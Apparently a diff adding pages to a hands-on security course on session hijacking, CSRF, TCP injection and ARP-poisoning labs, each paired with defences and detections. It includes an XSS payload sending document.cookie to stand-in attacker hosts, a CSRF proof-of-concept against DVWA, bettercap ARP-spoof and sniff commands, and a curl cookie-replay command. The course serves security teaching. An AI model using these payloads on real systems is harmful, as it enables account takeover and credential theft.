+          <rect x="360" y="12" width="220" height="38" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="37" text-anchor="middle" font-size="14">STEAL THE TOKEN</text>
+          <g class="node" data-node="sniff" tabindex="0"><rect x="20" y="78" width="205" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="122" y="100" text-anchor="middle" font-size="12.5">Sniffing</text><text class="d-sub" x="122" y="116" text-anchor="middle">cleartext / Wi-Fi</text></g>
+          <g class="node" data-node="xss" tabindex="0"><rect x="245" y="78" width="205" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="347" y="100" text-anchor="middle" font-size="12.5">XSS cookie theft</text><text class="d-sub" x="347" y="116" text-anchor="middle">document.cookie</text></g>
+          <g class="node" data-node="pred" tabindex="0"><rect x="470" y="78" width="205" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="572" y="100" text-anchor="middle" font-size="12.5">Prediction</text><text class="d-sub" x="572" y="116" text-anchor="middle">weak ID pattern</text></g>
+          <g class="node" data-node="fix" tabindex="0"><rect x="695" y="78" width="225" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="807" y="100" text-anchor="middle" font-size="12.5">Fixation</text><text class="d-sub" x="807" y="116" text-anchor="middle">set the ID first</text></g>
+          <g class="node" data-node="rep" tabindex="0"><rect x="150" y="140" width="260" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="280" y="162" text-anchor="middle" font-size="12.5">Replay</text><text class="d-sub" x="280" y="178" text-anchor="middle">reuse a captured token</text></g>
+          <g class="node" data-node="mitb" tabindex="0"><rect x="530" y="140" width="260" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="660" y="162" text-anchor="middle" font-size="12.5">Man-in-the-Browser</text><text class="d-sub" x="660" y="178" text-anchor="middle">trojan in the browser</text></g>
+          <path d="M430,50 L120,76" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M455,50 L347,76" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M485,50 L572,76" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M510,50 L807,76" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; how it grabs the token and where you have seen it before.</div>
+        <div class="dgm-detail" data-detail="sniff"><h5><span class="dd-tag">SNIFFING</span>Read it off the wire</h5><p><b>If the token travels over unencrypted HTTP (or you are the MITM), just capture it.</b> The coffee-shop sidejacking classic. Defence: TLS everywhere + the <span class="mono">Secure</span> cookie flag (never sent over HTTP).</p></div>
+        <div class="dgm-detail" data-detail="xss"><h5><span class="dd-tag">XSS COOKIE THEFT</span>The S8 payload, reused</h5><p><b>Inject <span class="mono">&lt;script&gt;new Image().src='//evil/?c='+document.cookie&lt;/script&gt;</span> and the victim&#39;s browser sends you the cookie.</b> Exactly your Session 8 stored-XSS finish. Defence: the <span class="mono">HttpOnly</span> flag makes <span class="mono">document.cookie</span> unable to read it.</p></div>
+        <div class="dgm-detail" data-detail="pred"><h5><span class="dd-tag">PREDICTION</span>Guess the next ID</h5><p><b>If session IDs are sequential or time-based, collect a few and predict a valid one for another user.</b> Rare today but devastating where present. Defence: long, cryptographically-random session IDs.</p></div>
+        <div class="dgm-detail" data-detail="fix"><h5><span class="dd-tag">FIXATION</span>Set the token first</h5><p><b>The attacker plants a known session ID in the victim&#39;s browser (via a link/param), the victim logs in, and the app keeps that same ID &mdash; which the attacker already knows.</b> Defence: <em>regenerate the session ID on login</em>, so the pre-set value is discarded.</p></div>
+        <div class="dgm-detail" data-detail="rep"><h5><span class="dd-tag">REPLAY</span>Reuse what you captured</h5><p><b>Capture a valid token and simply present it again to ride the session.</b> This is what you do in Lab B. Defence: short expiry, binding the token to IP/device, and invalidating it server-side on logout.</p></div>
+        <div class="dgm-detail" data-detail="mitb"><h5><span class="dd-tag">MAN-IN-THE-BROWSER</span>Malware inside the browser</h5><p><b>A trojan/extension inside the browser reads and alters transactions in real time &mdash; after decryption, so TLS does not help.</b> The banking-trojan technique (ties to Session 7). Defence: endpoint security, transaction signing, out-of-band confirmation.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; steal a cookie with the S8 XSS payload &mdash; then note the HttpOnly fix</span><pre><code># the stored-XSS finish from Session 8 IS session hijacking:
+&lt;script&gt;new Image().src='http://ATTACKER/c?='+document.cookie&lt;/script&gt;
+# the attacker's log now has the victim's session cookie -> replay it (Lab B)
+# DEFENCE test: is the cookie HttpOnly? dev-tools -> Application -> Cookies -> HttpOnly column
+#   HttpOnly = true  ->  document.cookie can't read it  ->  this attack fails</code></pre><p style="margin-top:8px"><b>You should see:</b> the same XSS you wrote last session steals the session cookie here &mdash; and the <span class="mono">HttpOnly</span> flag is the one-line fix that blocks it. Attack and defence, one payload.</p></div><div class="box key-takeaway"><span class="box-t">Every method has a flag that stops it</span><p><strong class="hl hl-d">Steal the token however you can; each way has a defence.</strong> Sniffing &rarr; <span class="mono">Secure</span>+TLS, XSS &rarr; <span class="mono">HttpOnly</span>, prediction &rarr; random IDs, fixation &rarr; regenerate on login, replay &rarr; expiry. Learn the pairs.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Steal &amp; replay">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P09</span><span class="tag attack">Attack &middot; the takeover flow</span><span class="time">&#9201; 6 min</span></div>
+      <h1>The Hijack &mdash; Steal the Cookie, Ride the Session</h1>
+      <p class="lede">Watch a stolen token become a full account takeover: capture it, load it into your browser, and you are logged in &mdash; no password.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">From token to takeover</span><p>However you obtained the cookie &mdash; sniffed, XSS&#39;d, or replayed &mdash; the takeover step is the same and shockingly simple: put the token in your own browser and the app treats you as the victim. Watch the flow; it is the reason session confidentiality matters so much.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Session takeover by replay: the attacker captures the victim's session cookie and presents it to the server, which serves the victim's authenticated session.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">logged in</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">holds the token</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">SERVER</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">trusts the token</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">attacker obtains the cookie (sniff / XSS / replay)</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="705" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">request with Cookie: session=&lt;stolen&gt;</text>
+          <path d="M526,174 L884,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">server: &quot;valid session&quot; &rarr; serves victim&#39;s account</text>
+          <path d="M884,228 L526,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">account takeover &mdash; no password, no MFA prompt</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: same token, new IP / user-agent</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The prize from the previous pages: a valid session cookie value.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The attacker sets the victim&#39;s cookie in their own browser and makes a normal request.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The server only checks the token, which is valid &mdash; so it serves the victim&#39;s authenticated pages to the attacker.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Authentication already happened; the attacker inherits it. MFA on login does not help once the session exists.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>A session used simultaneously from two IPs, or a sudden user-agent/geo change on one token, is the detection.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; replay a session cookie between browsers (your own account)</span><pre><code># 1. Log into a test app in Browser A. Copy the session cookie value.
+# 2. In Browser B (logged out), open dev-tools and set the same cookie for that site.
+# 3. Reload — Browser B is now logged in as you, no password.
+# a SOC sees: one session ID, two source IPs at once = hijack.</code></pre><p style="margin-top:8px"><b>You should see:</b> the cookie moved and the second browser inherited the session &mdash; a full takeover with nothing but the token. The detection is equally concrete: one session token appearing from two places at once.</p></div><div class="box key-takeaway"><span class="box-t">Confidentiality of the token is everything</span><p><strong class="hl">Whoever presents the token gets the session.</strong> Protect it in transit (TLS/Secure), from script (HttpOnly), and in time (expiry) &mdash; and watch for one token used from two places.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="CSRF">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P10</span><span class="tag attack">Attack &middot; forge the request</span><span class="time">&#9201; 6 min</span></div>
+      <h1>CSRF &mdash; Make the Victim&#39;s Browser Attack for You</h1>
+      <p class="lede">You do not need the token if the browser will send it for you. Watch a forged request ride the victim&#39;s own session.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Riding the session you cannot see</span><p><strong>Cross-Site Request Forgery</strong> is the clever cousin of hijacking: you never steal the token, you just get the victim&#39;s browser to <em>use</em> it. Because browsers attach a site&#39;s cookies to <em>every</em> request to that site &mdash; even ones triggered from another page &mdash; a hidden request on the attacker&#39;s page executes on the target site with the victim&#39;s full authority. Watch it.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="CSRF: the victim, logged into a target site, visits the attacker's page, which triggers a request to the target; the browser attaches the victim's cookie automatically.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER PAGE</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">hidden request</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM BROWSER</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">holds the cookie</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">TARGET SITE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">trusts the cookie</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--text-3)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">victim is logged into bank.com (cookie present)</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">victim visits attacker page with a hidden request</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">browser sends it WITH bank.com's cookie</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="705" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">bank.com: valid session &rarr; performs the action</text>
+          <path d="M884,282 L526,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">DEFENCE: anti-CSRF token + SameSite cookie</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The precondition: an active authenticated session with the target in the victim&#39;s browser.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000"&gt; &mdash; the victim just has to load the page.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Browsers attach the target&#39;s cookies to any request to that target, whatever page triggered it. The attacker never sees the cookie.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The server sees an authenticated, valid request and executes the transfer &mdash; on the victim&#39;s behalf.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>An unpredictable per-form token the attacker cannot guess, and SameSite=Lax/Strict so the cookie is not sent on cross-site requests.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; build a CSRF proof-of-concept (against your own lab app)</span><pre><code>&lt;!-- host this on any page; when a logged-in victim opens it, it fires --&gt;
+&lt;img src="http://DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"&gt;
+&lt;!-- DVWA's password-change happens with the victim's session, no token check --&gt;</code></pre><p style="margin-top:8px"><b>You should see:</b> loading the page silently changes the victim&#39;s password using <em>their</em> logged-in session &mdash; you never touched the cookie. The presence of an unguessable anti-CSRF token (and <span class="mono">SameSite</span>) is what makes this fail.</p></div><div class="box key-takeaway"><span class="box-t">Use the session, do not steal it</span><p><strong class="hl">CSRF abuses the browser&#39;s automatic cookie attachment.</strong> No token theft needed. The fix is a per-request anti-CSRF token plus <span class="mono">SameSite</span> cookies &mdash; both make the forged cross-site request fail.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="TCP hijacking">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P11</span><span class="tag attack">Attack &middot; the packet level</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Network-Level Hijacking &mdash; Injecting Into a TCP Session</h1>
+      <p class="lede">Below the application, a session is a TCP stream held together by sequence numbers. Predict them and you can inject as either side.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Hijacking the stream itself</span><p>Application hijacking steals a cookie; <strong>network-level hijacking</strong> attacks the transport. A TCP connection is kept in order by <strong>sequence numbers</strong>; if an attacker (usually already MITM, from the ARP page) can see or predict them, they can inject packets that the server accepts as part of the victim&#39;s session &mdash; even desynchronising the real client out. Watch the idea.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="TCP session hijacking: a MITM attacker observes the sequence numbers of an active connection and injects a spoofed packet the server accepts as legitimate.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">real client</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER (MITM)</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">sees the seq</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">SERVER</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">in a TCP session</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--text-3)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">victim &harr; server: an established TCP session</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">attacker (MITM) observes the SEQ/ACK numbers</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">inject a spoofed packet with the right SEQ</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">attacker&#39;s command runs in the victim&#39;s session</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">DEFENCE: encryption + randomised ISNs</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>An authenticated connection (e.g. an SSH/telnet/HTTP stream) already running, ordered by sequence numbers.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>From the middle, the attacker reads the current sequence numbers &mdash; the shared secret that keeps the stream in order.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The attacker forges a packet with the victim&#39;s IP and the correct next sequence number &mdash; the server accepts it as genuine.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The injected data (a command) executes as the victim. Blind hijacking does this without seeing responses, using predicted numbers.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>TLS/SSH make injected plaintext useless, and modern random initial sequence numbers make blind prediction infeasible.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; see the sequence numbers that hold a session together</span><pre><code>sudo tcpdump -i eth0 -n 'tcp' -S | head
+# the -S flag shows ABSOLUTE sequence numbers.
+# a MITM attacker who can read these can forge a packet with the next valid SEQ.
+# TLS/SSH don't hide the numbers — they make injected PLAINTEXT useless.</code></pre><p style="margin-top:8px"><b>You should see:</b> the sequence numbers are visible in any capture &mdash; they are what a hijacker needs. Note that encryption doesn&#39;t hide them; it makes any injected payload meaningless, which is why encrypted protocols defeat this attack in practice.</p></div><div class="box key-takeaway"><span class="box-t">Predict the sequence, own the stream</span><p><strong class="hl">TCP trusts sequence numbers.</strong> A MITM who reads them can inject as either side. Randomised ISNs stop blind prediction, and encryption (TLS/SSH) makes any injection useless &mdash; which is why cleartext protocols are the real risk.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab A: MITM &amp; sniff">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P12</span><span class="tag lab">Hands-on &middot; everyone &middot; attack</span><span class="time">&#9201; 18 min</span></div>
+      <h1>Lab A &mdash; ARP Poison, Then Sniff Credentials</h1>
+      <p class="lede">Become the man in the middle on your lab network and capture a cleartext credential &mdash; then watch the ARP anomaly you created.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The full MITM chain</span><p>You will poison a victim&#39;s ARP cache with <span class="mono">bettercap</span> (or <span class="mono">ettercap</span>), route their traffic through you, and capture a cleartext login in Wireshark &mdash; then look at your attack from the defender&#39;s side.</p></div><div class="box warn"><span class="box-t">Isolated lab, your own hosts only</span><p>ARP poisoning disrupts a real network and is illegal off your own lab. Two lab VMs (a victim and a gateway/target) on the host-only network, and an HTTP (not HTTPS) service to capture.</p></div>
+      <ol class="steps">
+<li>
+<b>Find the hosts</b> and enable forwarding so the victim keeps working (stay transparent):
+<pre><code>sudo bettercap -iface eth0
+> net.probe on            # discover LAN hosts
+> net.show                # list them: victim + gateway</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>bettercap maps the LAN. You need the victim IP and the gateway IP &mdash; the two ends you will sit between.</li></ul></div>
+</li>
+<li>
+<b>Poison</b> the victim &harr; gateway and start sniffing:
+<pre><code>> set arp.spoof.targets 192.168.56.10   # the victim
+> arp.spoof on
+> net.sniff on                          # capture traffic flowing through you</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Forged ARP replies now route the victim&#39;s traffic through you; <span class="mono">net.sniff</span> records it. You are the man in the middle.</li></ul></div>
+</li>
+<li>
+<b>Capture a credential</b> &mdash; have the victim log into the HTTP test service and watch it appear:
+<pre><code># in bettercap's sniff output, or in Wireshark:
+http.request and (frame contains "pass" or frame contains "user")
+# the cleartext username + password appear in the POST body</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The victim&#39;s HTTP login is in your capture in plaintext &mdash; the payoff of the MITM position. On HTTPS you would see only encrypted bytes (hence SSL strip / HSTS).</li></ul></div>
+</li>
+<li>
+<b>Flip to defender</b> &mdash; look at the ARP anomaly your attack created:
+<pre><code>arp -a          # on the victim: the gateway IP now shows YOUR MAC
+# arpwatch / XArp would alert: 'gateway 192.168.56.1 changed MAC'
+# stop cleanly:  > arp.spoof off   (restores the real mappings)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Your own attack is trivially visible from the ARP table &mdash; the gateway&#39;s MAC changed. That is the detection you will rule on in Lab E. Always stop the spoof cleanly.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">You were the middle &mdash; and it showed</span><p><strong class="hl">MITM gives you everything in cleartext &mdash; and leaves an ARP fingerprint.</strong> Poison, sniff, capture, then see the mapping change you caused. Attack and detection in one lab.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab B: hijack a session">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P13</span><span class="tag lab">Hands-on &middot; everyone &middot; attack</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab B &mdash; Steal and Replay a Session Cookie</h1>
+      <p class="lede">Take the token you can now sniff (or XSS) and ride the session &mdash; a full account takeover with no password, then the detection.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Token to takeover, for real</span><p>Combine this session&#39;s sniffing (or Session 8&#39;s XSS) with a cookie replay to take over an authenticated session on your lab app &mdash; then see the two-IP signature that gives it away.</p></div>
+      <ol class="steps">
+<li>
+<b>Obtain a token</b> &mdash; sniff it from the Lab A MITM position, or steal it with the S8 XSS payload:
+<pre><code># from Lab A's capture, pull the Cookie header:
+#   Cookie: PHPSESSID=abc123...
+# or from an XSS'd victim, read it out of your harvesting log</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Either route gives you a valid session cookie value &mdash; the only thing you need.</li></ul></div>
+</li>
+<li>
+<b>Replay it</b> &mdash; present the stolen cookie as your own:
+<pre><code>curl -b 'PHPSESSID=abc123...' http://APP/account
+# or set it in your browser's dev-tools cookies and reload the app
+# the app serves the VICTIM's authenticated account</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The server validates the token and serves the victim&#39;s session to you &mdash; logged in as them, no password, no MFA prompt.</li></ul></div>
+</li>
+<li>
+<b>Confirm takeover</b> and note what MFA does (and does not) stop:
+<pre><code># you can now act as the victim within their session.
+# note: MFA on LOGIN did nothing — the login already happened.
+# what limits you: short session expiry, or the app re-auth'ing for sensitive actions.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The takeover proves MFA-on-login is bypassed by session theft. The controls that <em>do</em> help &mdash; expiry, re-auth, token binding &mdash; are the ones you will recommend.</li></ul></div>
+</li>
+<li>
+<b>Flip to defender</b> &mdash; identify the detection:
+<pre><code># the SOC sees ONE session token used from TWO source IPs at once,
+# or a sudden user-agent / geolocation change on a live session.
+# rule: alert on concurrent use of a session ID from distinct IPs.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Concurrent use of one token from two IPs (or an impossible geo jump) is the hijack signature &mdash; your Lab E rule, and a real SOC detection.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">No password needed &mdash; and it is detectable</span><p><strong class="hl hl-d">A stolen token is a full login, but it leaves a trail.</strong> One session, two locations, is the tell. Defence: TLS + <span class="mono">Secure/HttpOnly</span>, short expiry, and concurrent-session detection.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Break &amp; checkpoint">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P14</span><span class="tag break">Pause &middot; 10 min</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Halfway &mdash; From the Wire to the Human</h1>
+      <p class="lede">You attacked the network and the session. After the break: the human (social engineering) and the service (DoS).</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you have done</span><p>First half attacked the <strong>machine layers</strong>: you sniffed the wire, became the man in the middle with ARP poisoning, stripped HTTPS, and hijacked a session by stealing and replaying its token (plus CSRF and TCP-level injection). Second half attacks the <strong>human</strong> &mdash; social engineering and phishing with SET &mdash; and the <strong>service&#39;s availability</strong> &mdash; DoS and DDoS &mdash; before consolidating every detection and the report.</p></div><div class="box do"><span class="box-t">Stretch-break checklist</span><p>Stop any ARP spoof cleanly (<span class="mono">arp.spoof off</span>) so your lab network is healthy. Save your capture and the stolen-cookie notes for the report. Keep the two-IP hijack signature in mind &mdash; it returns in Lab E. Back in five.</p></div><div class="box key-takeaway"><span class="box-t">The pivot to people</span><p><strong class="hl">The strongest crypto has a human at each end.</strong> The second half attacks the layer no patch protects &mdash; judgement &mdash; and the property no firewall guarantees &mdash; uptime.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Why people fall for it">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P15</span><span class="tag theory">Why &middot; the psychology</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Social Engineering &mdash; Hacking the Human</h1>
+      <p class="lede">The most reliable exploit targets no software at all. Learn the psychological levers that make good people click, and you learn the defence.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">No patch for judgement</span><p><strong>Social engineering</strong> attacks people, not systems &mdash; and it is the leading way real intrusions begin, because a human can be persuaded in ways a patched server cannot be exploited. It works by pulling <strong>psychological levers</strong> that normally serve us well: we defer to authority, we help under time pressure, we trust the familiar. Understanding <em>why</em> people comply is what lets you both run the attack and train people against it. Click each lever.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 200" role="img" aria-label="The psychological levers of social engineering: authority, urgency, trust/familiarity, fear, and reciprocity. Click each.">
